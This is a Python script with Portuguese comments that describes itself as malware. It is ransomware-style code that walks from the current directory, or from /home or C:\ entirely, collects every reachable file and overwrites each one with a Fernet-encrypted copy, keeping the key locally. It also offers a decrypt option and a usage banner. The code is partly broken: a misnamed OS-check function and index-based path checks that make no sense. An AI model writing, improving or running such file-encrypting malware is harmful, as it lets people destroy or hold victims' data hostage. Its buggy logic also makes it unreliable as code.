__author__ = "Wesley Ruam"

try:
    import os
    from cryptography.fernet import Fernet
    from pathlib import Path
    from platform import system
    from sys import argv
except:
    print("[!] Você deve ter instalado no seu computador todas essas bibliotecas instaladas")
    print("os, cryptography, pathlib, platform, sys")

# arquivos encontrados
files = list()

# pastas e subpastas encontradas
paths = list()

# verifica qual é o sistema operacional do computador
def verefy_os():
    if system() == "Linux":
        return 1
    else:
        return 0



def generate_key(path = f"{os.getcwd()}"):
    "Gera a chave para criptografar e descriptografar"
    key = Fernet.generate_key()

    with open(f"{path}/key.key", "wb") as chave:
        chave.write(key)


def look_paths_locate():
    "Procura por pastas apartir do diretorio em que o arquivo do malware se encontra.\n ex: o malware esta na pasta downloads, ele vai começar a verificar da pasta downloads pra frente"
    cwd = os.getcwd()
    for dir in os.listdir():
        if (os.path.isfile(dir) == False):
            paths.append(cwd + "/" + dir)


def look_path_all():
    "Diferente da funçõa 'look_paths_locate' esta, verifica as pastas desde o inicio, no linux começa na pasta home, e no windows começa na pasta C:\\"
    directory = "/home" if verify_os() == 1 else "C:\\"
    for dir in os.listdir(directory):
        if (os.path.isfile(dir) == False):
            paths.append(directory + "/" + dir + "/")


def look_subpaths():
    "Esta função apenas verifica as subpastas das pastas!"
    for dir in paths:
        try:
            for path in os.listdir(dir):
                diretorio = Path(dir + "/" + path)
                if (diretorio.is_dir()):
                    paths.append(dir + "/" + path)

                    #print(dir)

        except PermissionError:
            continue
    

def look_files():
    "Procura por todos os arquivos dentros das pastas e subpastas"
    
    for dir in paths:
        print(dir, ":")
        try:
            for file in os.listdir(dir):
                arq = Path(dir + "/" + file)
                if (arq.is_file()):
                    print("\t", dir + "/" + file)
                    files.append(dir + "/" + file)
        except PermissionError as e:
            print(e)
            continue


def encrypt_files(path = f"{os.getcwd()}/"):
    "Esta função serve para criptografar os arquivos"
    with open(f"{path}/key.key", "rb") as chave:
        key = chave.read()


    for file in files:
        with open(file, "rb") as arquivo:
            conteudo = arquivo.read()

        conteudo_encrypted = Fernet(key).encrypt(conteudo)
        with open(file, "wb") as arquivo:
            arquivo.write(conteudo_encrypted)

def decrypt_files(path = f"{os.getcwd()}"):
    "Esta função serve para descriptografar os arquivos"
    with open(f"{path}/key.key", "rb") as chave:
        key = chave.read()

    for file in files:
        with open(file, "rb") as arquivo:
            conteudo = arquivo.read()

        conteudo_decrypted = Fernet(key).decrypt(conteudo)
        with open(file, "wb") as arquivo:
            arquivo.write(conteudo_decrypted)

def save_paths():
    with open("paths.txt", "w") as saves:
        for e in files:
            saves.write(f"{e}\n")



# ARGUMENTOS

def help():
    print("""
[+] USAGE: malware.py [OPTIONS]

--encryptLocale | -eL : Criptografa todos os arquivos apartir do diretorio em que o malware se encontra
--encryptAll    | -eA : Criptograda todos os arquivos apartir da pasta '/home' se for Linux, 'C:' se for Windows
--generateKey   | -gK : Gera a chave de criptografia e descriptografia
--decryptFiles  | -dF : Descriptografa todos os arquivos criptografados

[+] EXAMPLES:

'ira criptografar todos os arquivos apartir do diretorio do malware e gera a chave no diretorio indicado'
malware.py --encryptLocale --generateKey "path/key.key"

'ira criptografar todos os arquivos apartir do /home ou C: do malware e gera a chave no diretorio indicado'
malware.py --encryptAll --generateKey "path/key.key"

'Ira descriptografar todos os arquivos utilizando a chave no diretorio indicado'
malware.py --decryptFiles -- generateKey "path/key.key"
""")


# busca as pastas onde o malware se encontra:
"""look_paths_locate()"""

#busca todas as pastas dentro da pasta home() se for Linux, C: se for windows:
"""look_path_all()"""

#busca subpastas
"""look_subpaths()"""

#procura os arquivos dentro de pastas e subpastas
"""look_files()"""

#gera a chave para a criptografia
"""generate_key()"""

#criptografa os arquivos encontrados
"""encrypt_files()"""


#descriptografa os arquivos criptografados 
"""decrypt_files()"""

if __name__ == "__main__":
    # argumento: "--help -H" | "--encryptLocale -eL" | "--encryptAll -eA" | "--generateKey -gK path/keyGenerated.key" | "--decryptFiles -dF"
    pathKey = ""

    ao = [['--encryptLocale', '-eL', "--generateKey", "-gK", "path/keyGenerated.key"], 
    ["--encryptAll", "-eA", "--generateKey", "-gK", "path/keyGenerated.key"], 
    ["--generateKey", "-gK", "path/keyGenerated.key", "--decryptFiles -dF"]]
    if len(argv) < 2:
        help()
        exit()


        ao = [['--encryptLocale', '-eL', "--generateKey", "-gK", "path/keyGenerated.key"], 
    ["--encryptAll", "-eA", "--generateKey", "-gK", "path/keyGenerated.key"], 
    ["--generateKey", "-gK", "path/keyGenerated.key", "--decryptFiles", "-dF"]]
    if len(argv) < 3 or len(argv) > 4:
        help()

    if len(argv) == 3:
        pathKey = os.getcwd()
    else:
        try:
            pathKey = (argv.index("-gK") + 1) if os.path.exists(argv.index("-gK")) == True or os.path.exists(argv.index("--generteKey")) == True else 1
        except ValueError as e:
            pathKey = (argv.index("--generateKey") + 1) if os.path.exists(argv.index("-gK")) == True or os.path.exists(argv.index("--generteKey")) == True else 1

    if pathKey == 1:
        print("[-] PATH NOT EXISTS")       
        exit()


    if "--encryptLocale" in argv and "--generateKey" in argv or "-eL" in argv and "-gK" in argv:
        generate_key(path = pathKey)
        look_paths_locate()
        look_subpaths()
        look_files()
        encrypt_files(path = pathKey)
    elif "--encryptAll" in argv and "--generateKey" in argv or "-eA" in argv and "-gK" in argv:
        generate_key(path = pathKey)
        look_path_all()
        look_subpaths()
        look_files()
        encrypt_files(path = pathKey)
    elif "--generateKey" in argv and "--decryptFiles" in argv or "-gK" in argv and "-dF":
        look_paths_locate()
        look_subpaths()
        look_files()
        decrypt_files(path = pathKey)
    else:
        help()


